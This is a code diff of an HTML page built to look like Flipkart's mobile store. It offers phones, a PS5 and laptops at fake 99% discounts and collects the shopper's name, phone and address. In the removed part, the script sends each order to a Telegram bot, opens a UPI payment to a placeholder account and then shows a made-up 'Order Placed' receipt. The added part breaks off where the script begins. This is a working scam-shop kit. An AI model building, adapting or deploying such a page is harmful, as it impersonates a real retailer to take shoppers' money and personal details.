@@ -1,377 +1,370 @@
-{\rtf1\ansi\ansicpg1252\cocoartf2822
-\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
-{\colortbl;\red255\green255\blue255;}
-{\*\expandedcolortbl;;}
-\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
-\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Flipkart | Product Details</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; }
+        .hidden { display: none !important; }
+        .fk-blue { background-color: #2874f0; }
+        .line-input { width: 100%; border-bottom: 1.5px solid #e0e0e0; padding: 12px 0; outline: none; font-size: 14px; background: transparent; }
+        .line-input:focus { border-bottom-color: #2874f0; }
+        /* Image Slider for Top Photos */
+        .slider-container { display: flex; overflow-x: scroll; snap-type: x mandatory; scrollbar-width: none; -ms-overflow-style: none; }
+        .slider-container::-webkit-scrollbar { display: none; }
+        .slider-item { min-width: 100%; snap-align: start; display: flex; justify-content: center; background: white; }
+      .product-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 10px; }
+.product-card { background: white; border-radius: 8px; padding: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; flex-col; justify-content: space-between; }
+    </style>
+</head>
+<body>
 
-\f0\fs24 \cf0 <!DOCTYPE html>\
-<html lang="en">\
-<head>\
-    <meta charset="UTF-8">\
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\
-    <title>Flipkart | Product Details</title>\
-    <script src="https://cdn.tailwindcss.com"></script>\
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">\
-    <style>\
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');\
-        body \{ font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; \}\
-        .hidden \{ display: none !important; \}\
-        .fk-blue \{ background-color: #2874f0; \}\
-        .line-input \{ width: 100%; border-bottom: 1.5px solid #e0e0e0; padding: 12px 0; outline: none; font-size: 14px; background: transparent; \}\
-        .line-input:focus \{ border-bottom-color: #2874f0; \}\
-        /* Image Slider for Top Photos */\
-        .slider-container \{ display: flex; overflow-x: scroll; snap-type: x mandatory; scrollbar-width: none; -ms-overflow-style: none; \}\
-        .slider-container::-webkit-scrollbar \{ display: none; \}\
-        .slider-item \{ min-width: 100%; snap-align: start; display: flex; justify-content: center; background: white; \}\
-      .product-grid \{ display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 10px; \}\
-.product-card \{ background: white; border-radius: 8px; padding: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; flex-col; justify-content: space-between; \}\
-    </style>\
-</head>\
-<body>\
-\
-    <div id="page-home">\
-        <header class="bg-white p-3 flex items-center justify-between sticky top-0 z-50 shadow-sm">\
-            <div class="flex items-center gap-3"><i class="fa-solid fa-bars text-xl text-gray-700"></i><img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-9"></div>\
-            <div class="relative"><i class="fa-solid fa-cart-shopping text-lg text-gray-700"></i><span class="absolute -top-2 -right-2 bg-red-500 text-white text-[9px] px-1 rounded-full">19</span></div>\
-        </header>\
-      <div class="bg-white p-3 shadow-sm sticky top-12 z-40">\
-            <div class="border-[1.5px] border-blue-500 rounded-lg flex items-center gap-3 px-3 py-2">\
-                <i class="fa-solid fa-magnifying-glass text-blue-500"></i>\
-                <input type="text" placeholder="Search for Products" class="w-full outline-none text-sm">\
-            </div>\
-        </div>\
-      <div class="grid grid-cols-5 gap-1 p-2 bg-white mt-2 text-[10px] text-center font-medium">\
-    \
-    <div class="flex flex-col items-center">\
-        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center p-2 mb-1">\
-            <img src="https://rukminim2.flixcart.com/fk-p-flap/128/128/image/ff559cb9d803d424.png?q=100" class="w-full h-full object-contain">\
-        </div>\
-        <span>Fashion</span>\
-    </div>\
-\
-    <div class="flex flex-col items-center">\
-        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center p-2 mb-1">\
-            <img src="https://rukminim2.flixcart.com/fk-p-flap/128/128/image/5f2ee7f883cdb774.png?q=100" class="w-full h-full object-contain">\
-        </div>\
-        <span>Mobiles &\
-          Tblets</span>\
-    </div>\
-\
-    <div class="flex flex-col items-center">\
-        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center p-2 mb-1">\
-            <img src="https://rukminim2.flixcart.com/fk-p-flap/128/128/image/e90944802d996756.jpg?q=100" class="w-full h-full object-contain">\
-        </div>\
-        <span>Appliances</span>\
-    </div>\
-\
-    <div class="flex flex-col items-center">\
-        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center p-2 mb-1">\
-            <img src="https://rukminim2.flixcart.com/fk-p-flap/128/128/image/b3020c99672953b9.png?q=100" class="w-full h-full object-contain">\
-        </div>\
-        <span>Beauty</span>\
-    </div>\
-\
-    <div class="flex flex-col items-center">\
-        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center p-2 mb-1">\
-            <img src="https://rukminim2.flixcart.com/fk-p-flap/128/128/image/af646c36d74c4be9.png?q=100" class="w-full h-full object-contain">\
-        </div>\
-        <span>Electronics</span>\
-    </div>\
-        </div>\
-      <div class="px-2 mt-2"><img src="https://rukminim2.flixcart.com/fk-p-flap/3240/540/image/1f9c9ad24c2bc37b.jpg?q=60" class="w-full rounded-xl"></div>\
-      \
-        </div>\
-\
-        <div class="bg-green-50 m-2 p-4 rounded-xl">\
-            <h3 class="font-bold text-gray-800 mb-3 text-sm">your, still looking for these?</h3>\
-            <div class="flex gap-3 overflow-x-auto pb-2">\
-                <div class="bg-white p-2 rounded-lg border min-w-[110px] shadow-sm"><img src="https://rukminim2.flixcart.com/image/612/612/xif0q/jacket/h/c/i/l-1-no-mt4-jkt-4-patti-light-grey-motrex-original-imahgvhxgbgchjtw.jpeg?q=70" class="h-20 mx-auto"><p class="text-[9px] text-center mt-1">Jackets</p></div>\
-                <div class="bg-white p-2 rounded-lg border min-w-[110px] shadow-sm"><img src="https://rukminim2.flixcart.com/image/360/360/xif0q/slipper-flip-flop/p/g/d/8-gp-775-black-red-belizza-black-red-original-imah3xxbnvdtzrvw.jpeg?q=60" class="h-20 mx-auto"><p class="text-[9px] text-center mt-1">Slippers</p></div>\
-            </div>\
-        </div>\
-  <div class="bg-white mt-2">\
-    <div class="flex items-center justify-between p-3 border-b">\
-        <div class="flex items-center gap-2">\
-            <h3 class="font-bold text-sm">Deals of the Day</h3>\
-            <div class="flex items-center gap-1 bg-red-100 text-red-600 px-2 py-0.5 rounded text-[10px] font-bold">\
-                <i class="fa-regular fa-clock"></i>\
-                <span id="deal-timer">00h 00m 00s</span>\
-            </div>\
-        </div>\
-        <button class="bg-blue-600 text-white text-[10px] font-bold px-3 py-1.5 rounded-sm">VIEW ALL</button>\
-    </div>\
-    \
-    <div class="p-2">\
-        <img src="https://rukminim2.flixcart.com/fk-p-flap/3200/540/image/66faf3950cda0b7a.png?q=60" class="w-full rounded-lg shadow-sm">\
-    </div>\
-</div>\
-        <div id="v-list" class="mt-2 bg-white"></div>\
-    </div>\
-\
-    <div id="page-detail" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto pb-20">\
-        <nav class="sticky top-0 bg-white border-b p-3 flex items-center justify-between z-[210]">\
-            <div class="flex items-center gap-4">\
-                <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>\
-                <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-4">\
-            </div>\
-            <i class="fa-solid fa-cart-shopping text-gray-600"></i>\
-        </nav>\
-\
-        <div class="slider-container py-4" id="main-slider"></div>\
-\
-        <div class="p-4">\
-            <h2 id="det-name" class="text-base font-medium text-gray-800 leading-tight"></h2>\
-            <div class="flex items-center gap-2 mt-2">\
-                <span class="bg-green-700 text-white text-[10px] px-1.5 py-0.5 rounded flex items-center gap-1">4.4 <i class="fa-solid fa-star text-[8px]"></i></span>\
-                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-4">\
-            </div>\
-            <div class="flex items-baseline gap-2 mt-3">\
-                <span id="det-price" class="text-2xl font-bold"></span>\
-                <span id="det-mrp" class="text-gray-400 line-through text-sm"></span> <span class="text-green-600 font-bold text-sm">99% OFF</span>\
-            </div>\
-            <p class="text-green-700 text-xs font-bold mt-1">Free delivery</p>\
-          <div class="bg-white p-4 mt-2">\
-    <h3 class="text-sm font-bold mb-2">Highlights</h3>\
-    <ul id="det-highlights" class="text-xs space-y-2 text-gray-600 list-disc ml-4">\
-        </ul>\
-</div>\
-        </div>\
-\
-        <div class="bg-gray-100 p-2 font-bold text-gray-500 text-[10px] uppercase">Product Description</div>\
-        <div id="desc-container" class="flex flex-col"></div>\
-\
-        <div class="fixed bottom-0 w-full h-14 flex border-t bg-white z-[220]">\
-            <button class="w-1/2 font-bold text-gray-700 bg-white uppercase text-sm">Add to Cart</button>\
-            <button onclick="showPage('page-address')" class="w-1/2 bg-[#ff9f00] text-white font-bold uppercase text-sm">Buy Now</button>\
-        </div>\
-    </div>\
-\
-    <div id="page-address" class="hidden fixed inset-0 bg-white z-[300] overflow-y-auto">\
-        <nav class="fk-blue p-4 text-white flex items-center gap-4 sticky top-0">\
-            <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>\
-            <span class="font-medium">Add Delivery Address</span>\
-        </nav>\
-        <div class="p-5 space-y-6">\
-            <input type="text" id="inp-name" placeholder="Full Name (Required)*" class="line-input">\
-            <input type="tel" id="inp-phone" maxlength="10" placeholder="Phone Number (Required)*" class="line-input">\
-            <div class="flex gap-4">\
-                <input type="number" id="inp-pin" placeholder="Pincode*" class="line-input">\
-                <input type="text" id="inp-state" placeholder="State*" class="line-input">\
-            </div>\
-            <input type="text" id="inp-city" placeholder="City*" class="line-input">\
-            <input type="text" id="inp-house" placeholder="House No., Building Name*" class="line-input">\
-            <input type="text" id="inp-road" placeholder="Road Name, Area, Colony*" class="line-input">\
-            <button onclick="goToSummary()" class="w-full bg-[#fb641b] text-white font-bold py-4 rounded-sm uppercase mt-4 shadow-lg">Save and Continue</button>\
-        </div>\
-    </div>\
-\
-    <div id="page-summary" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto pb-20">\
-        <nav class="fk-blue p-4 text-white flex items-center gap-4"><i class="fa-solid fa-arrow-left" onclick="showPage('page-address')"></i><span class="font-medium">Order Summary</span></nav>\
-        <div class="bg-white p-4 mb-2 shadow-sm">\
-            <p id="sum-name" class="font-bold text-sm"></p>\
-            <p id="sum-addr" class="text-xs text-gray-500 leading-relaxed mt-1"></p>\
-            <p id="sum-phone" class="text-xs font-bold mt-1 text-gray-800"></p>\
-        </div>\
-        <div class="bg-white p-4 flex gap-4 border-b">\
-            <img id="sum-img" class="h-20 w-20 object-contain border p-1 rounded">\
-            <div>\
-                <p id="sum-item" class="text-xs font-medium line-clamp-2"></p>\
-                <p id="sum-price" class="font-bold text-lg mt-2"></p>\
-            </div>\
-        </div>\
-        <div class="fixed bottom-0 w-full bg-white p-3 border-t flex justify-between items-center z-[410]">\
-            <span id="sum-total-bottom" class="font-bold text-xl"></span>\
-            <button onclick="processOrder()" class="bg-[#fb641b] text-white px-10 py-3 font-bold uppercase rounded-sm">Continue</button>\
-        </div>\
-    </div>\
-\
-    <div id="page-receipt" class="hidden fixed inset-0 bg-[#f1f3f6] z-[600] overflow-y-auto">\
-        <div class="bg-white p-8 text-center border-b">\
-            <div class="w-16 h-16 bg-[#388e3c] rounded-full flex items-center justify-center mx-auto mb-4"><i class="fa-solid fa-check text-3xl text-white"></i></div>\
-            <h2 class="text-xl font-bold">Order Placed!</h2>\
-        </div>\
-        <div class="bg-white mt-2 p-4 border-y">\
-            <p class="text-[10px] text-gray-400 font-bold uppercase">Order ID: <span id="rec-oid" class="text-gray-700"></span></p>\
-            <div class="flex gap-4 mt-4">\
-                <img id="rec-img" class="h-16 w-16 object-contain border p-1 rounded">\
-                <p id="rec-item" class="text-xs font-medium text-gray-800 line-clamp-2"></p>\
-            </div>\
-        </div>\
-        <div class="p-4"><button onclick="location.reload()" class="w-full bg-[#2874f0] text-white font-bold py-4 rounded-sm uppercase">Continue Shopping</button></div>\
-    </div>\
-\
-    <script>\
-        const botToken = "YOUR_TOKEN"; \
-        const chatId = "YOUR_ID"; \
-        const upiId = "yourname@upi";\
-\
-       const products = [\
-    \{ \
-        id: 1, \
-        name: "Apple iPhone 16 Pro Max (Black Titanium, 256 GB)", \
-        price: 1399, \
-        mrp: "1,44,900",\
-        images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/w/z/h/-original-imahggetkf6y67sr.jpeg?q=70"],\
-        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"],\
-      highlights: ["12 GB RAM | 256 GB ROM", "17.27 cm (6.8 inch) QHD+ Display", "200MP + 50MP + 12MP + 10MP Camera", "5000 mAh Battery"]\
-    \},\
-    \{ \
-        id: 2, \
-        name: "SAMSUNG Galaxy S24 Ultra 5G (Titanium Gray, 256 GB)", \
-        price: 1199, \
-        mrp: "1,34,999",\
-        images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imagy9797asvcbp6.jpeg?q=70"],\
-        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"]\
-    \},\
-    \{ \
-        id: 3, \
-        name: "Sony PS5 Console (Slim) 1 TB White", \
-        price: 499, \
-        mrp: "54,990",\
-        images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/m/-original-imahyv9aryf768hz.jpeg?q=70"],\
-        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"]\
-    \},\
-    \{ \
-        id: 4, \
-        name: "Apple MacBook AIR M2 - (8 GB/256 GB SSD)", \
-        price: 899, \
-        mrp: "99,900",\
-        images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/computer/2/v/v/-original-imagfdeqter4sj26.jpeg?q=70"],\
-        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"]\
-    \},\
-    \{ \
-        id: 5, \
-        name: "Canon EOS R100 Mirrorless Camera", \
-        price: 399, \
-        mrp: "64,950",\
-        images: ["https://rukminim2.flixcart.com/image/312/312/xif0q/camera/f/n/l/eos-r100-24-1-r100-canon-original-imagrn39hfv6u38t.jpeg?q=70"],\
-        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"]\
-    \},\
-    \{ \
-        id: 6, \
-        name: "Noise ColorFit Icon 2 Smartwatch", \
-        price: 129, \
-        mrp: "5,999",\
-        images: ["https://rukminim2.flixcart.com/image/612/612/xif0q/smartwatch/q/f/m/-original-imagxp8vjsh8vgyp.jpeg?q=70"],\
-        descImages: ["https://i.ibb.co/Df2xt4H3/convert.jpg"]\
-    \}\
-];\
-\
-        let curP = null;\
-\
-        function showPage(id) \{\
-            document.querySelectorAll('div[id^="page-"]').forEach(p => p.classList.add('hidden'));\
-            document.getElementById(id).classList.remove('hidden');\
-            window.scrollTo(0,0);\
-        \}\
-\
-        function loadHome() \{\
-    const list = document.getElementById('v-list');\
-    list.className = "product-grid"; // Grid class yahan lagayi\
-    list.innerHTML = products.map(p => `\
-        <div class="product-card" onclick="openProduct($\{p.id\})">\
-            <img src="$\{p.images[0]\}" class="w-full h-32 object-contain mb-2">\
-            <div>\
-                <p class="text-[11px] font-medium line-clamp-2 text-gray-800 mb-1">$\{p.name\}</p>\
-                <div class="flex items-center gap-1">\
-                    <span class="text-sm font-bold">\uc0\u8377 $\{p.price.toLocaleString()\}</span>\
-                    <span class="text-gray-400 line-through text-[9px]">\uc0\u8377 $\{p.mrp\}</span>\
-                </div>\
-                <p class="text-green-600 text-[9px] font-bold">Free Delivery</p>\
-            </div>\
-        </div>\
-    `).join('');\
-\}\
-\
-        function openProduct(id) \{\
-    // 1. Product data dhoondhna\
-    curP = products.find(x => x.id === id);\
-    \
-    // 2. Name aur Price set karna\
-    document.getElementById('det-name').innerText = curP.name;\
-    document.getElementById('det-price').innerText = "\uc0\u8377 " + curP.price.toLocaleString();\
-    document.getElementById('det-mrp').innerText = "\uc0\u8377 " + curP.mrp;\
-\
-    // 3. Top Slider (Photos) load karna\
-    const slider = document.getElementById('main-slider');\
-    slider.innerHTML = curP.images.map(img => `\
-        <div class="slider-item">\
-            <img src="$\{img\}" class="h-72 object-contain">\
-        </div>\
-    `).join('');\
-\
-    // 4. HIGHLIGHTS (Naya Section) load karna\
-    const highCont = document.getElementById('det-highlights');\
-    if (curP.highlights && curP.highlights.length > 0) \{\
-        highCont.innerHTML = curP.highlights.map(h => `<li>$\{h\}</li>`).join('');\
-    \} else \{\
-        highCont.innerHTML = "<li>No specific highlights available</li>";\
-    \}\
-\
-    // 5. Description Images load karna\
-    const descCont = document.getElementById('desc-container');\
-    descCont.innerHTML = curP.descImages.map(img => `\
-        <img src="$\{img\}" class="w-full">\
-    `).join('');\
-    \
-    // 6. Checkout Summary ko update karna (Summary page ke liye)\
-    document.getElementById('sum-img').src = curP.images[0];\
-    document.getElementById('sum-item').innerText = curP.name;\
-    document.getElementById('sum-price').innerText = "\uc0\u8377 " + curP.price.toLocaleString();\
-    document.getElementById('sum-total-bottom').innerText = "\uc0\u8377 " + (curP.price + 3).toLocaleString();\
-    \
-    // 7. Page change karna\
-    showPage('page-detail');\
-\}\
-        function goToSummary() \{\
-            const name = document.getElementById('inp-name').value;\
-            const phone = document.getElementById('inp-phone').value;\
-            if(!name || phone.length < 10) return alert("Fill Details!");\
-            document.getElementById('sum-name').innerText = name;\
-            document.getElementById('sum-phone').innerText = phone;\
-            document.getElementById('sum-addr').innerText = `$\{document.getElementById('inp-house').value\}, $\{document.getElementById('inp-city').value\}`;\
-            showPage('page-summary');\
-        \}\
-\
-        function processOrder() \{\
-            const msg = `\uc0\u55357 \u56960  NEW ORDER: $\{curP.name\} | Customer: $\{document.getElementById('inp-name').value\}`;\
-            fetch(`https://api.telegram.org/bot$\{botToken\}/sendMessage?chat_id=$\{chatId\}&text=$\{encodeURIComponent(msg)\}`);\
-            window.location.href = `upi://pay?pa=$\{upiId\}&pn=Flipkart&am=$\{curP.price+3\}&cu=INR`;\
-            setTimeout(() => \{\
-                document.getElementById('rec-oid').innerText = "OD" + Date.now();\
-                document.getElementById('rec-img').src = curP.images[0];\
-                document.getElementById('rec-item').innerText = curP.name;\
-                showPage('page-receipt');\
-            \}, 3000);\
-        \}\
- function startTimer() \{\
-    function updateTimer() \{\
-        const now = new Date();\
-        const endOfDay = new Date();\
-        endOfDay.setHours(23, 59, 59, 999); // Aaj raat 12 baje tak ka time\
-\
-        const diff = endOfDay - now;\
-\
-        const h = Math.floor(diff / (1000 * 60 * 60));\
-        const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));\
-        const s = Math.floor((diff % (1000 * 60)) / 1000);\
-\
-        document.getElementById('deal-timer').innerText = \
-            `$\{h.toString().padStart(2, '0')\}h $\{m.toString().padStart(2, '0')\}m $\{s.toString().padStart(2, '0')\}s left`;\
-    \}\
-    \
-    setInterval(updateTimer, 1000);\
-    updateTimer();\
-\}\
-\
-// Apne purane window.onload ko aise update karein:\
-// Purane dono window.onload ko hata kar sirf ye ek likhein\
-window.onload = function() \{\
-    loadHome();   // Products load karega\
-    startTimer(); // Timer shuru karega\
-\};\
-       \
-    </script>\
-</body>\
-</html>}
+    <div id="page-home">
+        <header class="bg-white p-3 flex items-center justify-between sticky top-0 z-50 shadow-sm">
+            <div class="flex items-center gap-3"><i class="fa-solid fa-bars text-xl text-gray-700"></i><img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-9"></div>
+            <div class="relative"><i class="fa-solid fa-cart-shopping text-lg text-gray-700"></i><span class="absolute -top-2 -right-2 bg-red-500 text-white text-[9px] px-1 rounded-full">19</span></div>
+        </header>
+      <div class="bg-white p-3 shadow-sm sticky top-12 z-40">
+            <div class="border-[1.5px] border-blue-500 rounded-lg flex items-center gap-3 px-3 py-2">
+                <i class="fa-solid fa-magnifying-glass text-blue-500"></i>
+                <input type="text" placeholder="Search for Products" class="w-full outline-none text-sm">
+            </div>
+        </div>
+      <div class="grid grid-cols-5 gap-1 p-2 bg-white mt-2 text-[10px] text-center font-medium">
+    
+    <div class="flex flex-col items-center">
+        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center p-2 mb-1">
+            <img src="https://rukminim2.flixcart.com/fk-p-flap/128/128/image/ff559cb9d803d424.png?q=100" class="w-full h-full object-contain">
+        </div>
+        <span>Fashion</span>
+    </div>
+
+    <div class="flex flex-col items-center">
+        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center p-2 mb-1">
+            <img src="https://rukminim2.flixcart.com/fk-p-flap/128/128/image/5f2ee7f883cdb774.png?q=100" class="w-full h-full object-contain">
+        </div>
+        <span>Mobiles &
+          Tblets</span>
+    </div>
+
+    <div class="flex flex-col items-center">
+        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center p-2 mb-1">
+            <img src="https://rukminim2.flixcart.com/fk-p-flap/128/128/image/e90944802d996756.jpg?q=100" class="w-full h-full object-contain">
+        </div>
+        <span>Appliances</span>
+    </div>
+
+    <div class="flex flex-col items-center">
+        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center p-2 mb-1">
+            <img src="https://rukminim2.flixcart.com/fk-p-flap/128/128/image/b3020c99672953b9.png?q=100" class="w-full h-full object-contain">
+        </div>
+        <span>Beauty</span>
+    </div>
+
+    <div class="flex flex-col items-center">
+        <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center p-2 mb-1">
+            <img src="https://rukminim2.flixcart.com/fk-p-flap/128/128/image/af646c36d74c4be9.png?q=100" class="w-full h-full object-contain">
+        </div>
+        <span>Electronics</span>
+    </div>
+        </div>
+      <div class="px-2 mt-2"><img src="https://rukminim2.flixcart.com/fk-p-flap/3240/540/image/1f9c9ad24c2bc37b.jpg?q=60" class="w-full rounded-xl"></div>
+      
+        </div>
+
+        <div class="bg-green-50 m-2 p-4 rounded-xl">
+            <h3 class="font-bold text-gray-800 mb-3 text-sm">your, still looking for these?</h3>
+            <div class="flex gap-3 overflow-x-auto pb-2">
+                <div class="bg-white p-2 rounded-lg border min-w-[110px] shadow-sm"><img src="https://rukminim2.flixcart.com/image/612/612/xif0q/jacket/h/c/i/l-1-no-mt4-jkt-4-patti-light-grey-motrex-original-imahgvhxgbgchjtw.jpeg?q=70" class="h-20 mx-auto"><p class="text-[9px] text-center mt-1">Jackets</p></div>
+                <div class="bg-white p-2 rounded-lg border min-w-[110px] shadow-sm"><img src="https://rukminim2.flixcart.com/image/360/360/xif0q/slipper-flip-flop/p/g/d/8-gp-775-black-red-belizza-black-red-original-imah3xxbnvdtzrvw.jpeg?q=60" class="h-20 mx-auto"><p class="text-[9px] text-center mt-1">Slippers</p></div>
+            </div>
+        </div>
+  <div class="bg-white mt-2">
+    <div class="flex items-center justify-between p-3 border-b">
+        <div class="flex items-center gap-2">
+            <h3 class="font-bold text-sm">Deals of the Day</h3>
+            <div class="flex items-center gap-1 bg-red-100 text-red-600 px-2 py-0.5 rounded text-[10px] font-bold">
+                <i class="fa-regular fa-clock"></i>
+                <span id="deal-timer">00h 00m 00s</span>
+            </div>
+        </div>
+        <button class="bg-blue-600 text-white text-[10px] font-bold px-3 py-1.5 rounded-sm">VIEW ALL</button>
+    </div>
+    
+    <div class="p-2">
+        <img src="https://rukminim2.flixcart.com/fk-p-flap/3200/540/image/66faf3950cda0b7a.png?q=60" class="w-full rounded-lg shadow-sm">
+    </div>
+</div>
+        <div id="v-list" class="mt-2 bg-white"></div>
+    </div>
+
+    <div id="page-detail" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto pb-20">
+        <nav class="sticky top-0 bg-white border-b p-3 flex items-center justify-between z-[210]">
+            <div class="flex items-center gap-4">
+                <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>
+                <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-4">
+            </div>
+            <i class="fa-solid fa-cart-shopping text-gray-600"></i>
+        </nav>
+
+        <div class="slider-container py-4" id="main-slider"></div>
+
+        <div class="p-4">
+            <h2 id="det-name" class="text-base font-medium text-gray-800 leading-tight"></h2>
+            <div class="flex items-center gap-2 mt-2">
+                <span class="bg-green-700 text-white text-[10px] px-1.5 py-0.5 rounded flex items-center gap-1">4.4 <i class="fa-solid fa-star text-[8px]"></i></span>
+                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-4">
+            </div>
+            <div class="flex items-baseline gap-2 mt-3">
+                <span id="det-price" class="text-2xl font-bold"></span>
+                <span id="det-mrp" class="text-gray-400 line-through text-sm"></span> <span class="text-green-600 font-bold text-sm">99% OFF</span>
+            </div>
+            <p class="text-green-700 text-xs font-bold mt-1">Free delivery</p>
+          <div class="bg-white p-4 mt-2">
+    <h3 class="text-sm font-bold mb-2">Highlights</h3>
+    <ul id="det-highlights" class="text-xs space-y-2 text-gray-600 list-disc ml-4">
+        </ul>
+</div>
+        </div>
+
+        <div class="bg-gray-100 p-2 font-bold text-gray-500 text-[10px] uppercase">Product Description</div>
+        <div id="desc-container" class="flex flex-col"></div>
+
+        <div class="fixed bottom-0 w-full h-14 flex border-t bg-white z-[220]">
+            <button class="w-1/2 font-bold text-gray-700 bg-white uppercase text-sm">Add to Cart</button>
+            <button onclick="showPage('page-address')" class="w-1/2 bg-[#ff9f00] text-white font-bold uppercase text-sm">Buy Now</button>
+        </div>
+    </div>
+
+    <div id="page-address" class="hidden fixed inset-0 bg-white z-[300] overflow-y-auto">
+        <nav class="fk-blue p-4 text-white flex items-center gap-4 sticky top-0">
+            <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
+            <span class="font-medium">Add Delivery Address</span>
+        </nav>
+        <div class="p-5 space-y-6">
+            <input type="text" id="inp-name" placeholder="Full Name (Required)*" class="line-input">
+            <input type="tel" id="inp-phone" maxlength="10" placeholder="Phone Number (Required)*" class="line-input">
+            <div class="flex gap-4">
+                <input type="number" id="inp-pin" placeholder="Pincode*" class="line-input">
+                <input type="text" id="inp-state" placeholder="State*" class="line-input">
+            </div>
+            <input type="text" id="inp-city" placeholder="City*" class="line-input">
+            <input type="text" id="inp-house" placeholder="House No., Building Name*" class="line-input">
+            <input type="text" id="inp-road" placeholder="Road Name, Area, Colony*" class="line-input">
+            <button onclick="goToSummary()" class="w-full bg-[#fb641b] text-white font-bold py-4 rounded-sm uppercase mt-4 shadow-lg">Save and Continue</button>
+        </div>
+    </div>
+
+    <div id="page-summary" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto pb-20">
+        <nav class="fk-blue p-4 text-white flex items-center gap-4"><i class="fa-solid fa-arrow-left" onclick="showPage('page-address')"></i><span class="font-medium">Order Summary</span></nav>
+        <div class="bg-white p-4 mb-2 shadow-sm">
+            <p id="sum-name" class="font-bold text-sm"></p>
+            <p id="sum-addr" class="text-xs text-gray-500 leading-relaxed mt-1"></p>
+            <p id="sum-phone" class="text-xs font-bold mt-1 text-gray-800"></p>
+        </div>
+        <div class="bg-white p-4 flex gap-4 border-b">
+            <img id="sum-img" class="h-20 w-20 object-contain border p-1 rounded">
+            <div>
+                <p id="sum-item" class="text-xs font-medium line-clamp-2"></p>
+                <p id="sum-price" class="font-bold text-lg mt-2"></p>
+            </div>
+        </div>
+        <div class="fixed bottom-0 w-full bg-white p-3 border-t flex justify-between items-center z-[410]">
+            <span id="sum-total-bottom" class="font-bold text-xl"></span>
+            <button onclick="processOrder()" class="bg-[#fb641b] text-white px-10 py-3 font-bold uppercase rounded-sm">Continue</button>
+        </div>
+    </div>
+
+    <div id="page-receipt" class="hidden fixed inset-0 bg-[#f1f3f6] z-[600] overflow-y-auto">
+        <div class="bg-white p-8 text-center border-b">
+            <div class="w-16 h-16 bg-[#388e3c] rounded-full flex items-center justify-center mx-auto mb-4"><i class="fa-solid fa-check text-3xl text-white"></i></div>
+            <h2 class="text-xl font-bold">Order Placed!</h2>
+        </div>
+        <div class="bg-white mt-2 p-4 border-y">
+            <p class="text-[10px] text-gray-400 font-bold uppercase">Order ID: <span id="rec-oid" class="text-gray-700"></span></p>
+            <div class="flex gap-4 mt-4">
+                <img id="rec-img" class="h-16 w-16 object-contain border p-1 rounded">
+                <p id="rec-item" class="text-xs font-medium text-gray-800 line-clamp-2"></p>
+            </div>
+        </div>
+        <div class="p-4"><button onclick="location.reload()" class="w-full bg-[#2874f0] text-white font-bold py-4 rounded-sm uppercase">Continue Shopping</button></div>
+    </div>
+
+    <script>
+        const botToken = "YOUR_TOKEN"; 
